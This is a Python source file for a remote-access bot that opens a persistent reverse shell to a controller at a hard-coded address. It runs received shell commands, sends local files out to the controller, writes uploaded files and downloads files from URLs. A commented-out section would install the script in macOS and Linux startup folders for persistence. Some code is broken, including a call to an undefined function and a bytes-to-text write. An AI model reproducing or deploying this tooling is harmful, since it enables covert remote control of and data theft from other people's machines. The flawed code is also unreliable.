#!/usr/local/bin/python3

import socket
import subprocess
import json
import os
import time
import requests

def connection(sock): # Function that attempts a connection on repeat
    # This function is very important because it allows us to disconnect and reconnect to our shell
    # on our own time

    while True:
        time.sleep(1) # Attempts to connect every _ seconds
        try:
            sock.connect(('192.168.1.2', 6996)) # try to connect
            botShell(sock) # if connected, go to the shell 
        except:
            sock.close() # Close the connection
            main() # Go back to main and restart whole connection, guarentee fresh connection every time
            # lost time and efficiency but can guarentee a solid connection


def sendOutput(data, target): # Send the output from commands
    try:
        json_data = json.dumps(data) # Take all data in one variable
        target.send(json_data.encode()) # Encode and send this data to Control Center
    except:
        data = '[!!]Error Occurred on Bot Side'
        target.send(data.encode()) # If the previous commands fail, send error msg

def receiveCommand(target): # Receive commands from this function

    while True:
        try:
            data = target.recv(4096) # receive information in 4096 byte chunks
            data = data.decode('utf-8') # Decode this data to be read 
            return json.loads(data) # Return this data to previous function
        except:
            continue


def downloads(url):

    get_response = requests.get(url) # Get a response from a URL 
    file_name = url.split('/')[-1] # If the connection works, name a file after the directory
    with open(file_name, 'w') as out_file: # Open this file 
        out_file.write(get_response.content) # Write all the contents of the URL File onto our File

def botShellx(sock): # The Bot side shell
    while True:
        command = receiveCommand(sock) # Listen for a command

        if command == 'quit': # Set controls for certain commands so the connection is always available
            connection(sock)

        elif command[:2] == 'cd' and len(command) > 1:
            os.chdir(command[3:]) # Change the directory with os.chdir() function using the directory entered
            cd = subprocess.getoutput('pwd') # Get the working directory
            sendOutput(cd, sock) # Send the current directory to the host 

        elif command[:8] == 'download': # If the incoming command is download, the host wants something
            file = command[9:] # Find out what the file is
            data = '' # create an empty string
            with open(file.strip('\n'), 'r') as send_file: # open the file 
                for line in send_file: # Copy each line to a variable
                    data += str(line)
                sendOutput(str(data), sock) # Send this data to the host to be written
            send_file.close() # close the file

        elif command[:6] == 'upload':
            file = command[7:]
            data = str(receiveCommand(sock))
            with open(file.strip('\n'), 'w') as newFile:
                newFile.write(str(data))
            newFile.close()

        elif command[:3] == 'get': # If the host wants to download something onto the host machine from the internet
            try:
                downloads(command[4:]) # Send the link to the downloads function
                sendOutput("[+]File Downloaded Successfully", sock) # tell the user of the success

            except:
                sendOutput("[-]Download Failed", sock) # Or tell them it failed 

        else:
            output = subprocess.getoutput(str(command)) # If the command is nothing special, the output is whatever prints on the screen
            sendOutput(output, sock) # send this output to the host


def main():

    #location = subprocess.getoutput('pwd') # Allow the program to learn its location
    #try: # Use this location to move a copy of the program to the startup folders
        #os.system('sudo cp ' + location + '/localServer.py /Library/StartupItems') # Mac Startup folder
        #os.system('sudo cp ' + location + '/localServer.py /System/Library/StartupItems') # Mac Startup Folder
    #except:
        #print('') # If the file fails to move, print a blank strung
    #try: # The first two are for mac, last one is for Linux. Allows cross OS.
        #os.system('sudo cp ' + location + '/localServer.py /etc/init.d') # Linux Startup Folder
    #except:
        #print('')

    # The code above allows for the application of this program on both linux and mac machines

    try:
        sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM) # Create our socket connection
        # AF_INET uses IPv4 or hostname 
        # SOCK_STREAM is one of two working socket types 

        connection(sock)

    except:
        quit()


if __name__ == '__main__':

    main()

#            ___
#         __/   \__
#        |_  ___  _|
#          /\   /\
#         / /   \ \
#         \ \   / /
#          \ \ / /  
#         >\(?_?)/<
#
# 01000001 01101110 01101111 01101110 01111001 01101101 01101111 01110101 01110011 
# 00110000 01101110 01111001 01111000
